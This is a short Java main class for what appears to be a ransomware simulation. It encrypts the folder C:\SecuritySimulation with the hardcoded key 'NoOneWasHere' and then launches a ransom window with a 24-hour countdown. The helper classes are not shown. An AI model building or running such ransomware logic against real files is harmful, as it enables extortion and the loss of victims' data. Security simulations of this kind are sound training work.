import javax.swing.*;
import java.io.File;

public class Main {
    public static void main(String[] args) {
        String key = "NoOneWasHere";
        File folder = new File("C:\\SecuritySimulation");

        try {
            FileEncryptor.encryptFolder(folder, key);
            SwingUtilities.invokeLater(() -> new RansomGUI(folder, key, 24 * 60 * 60 * 1000L).show());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
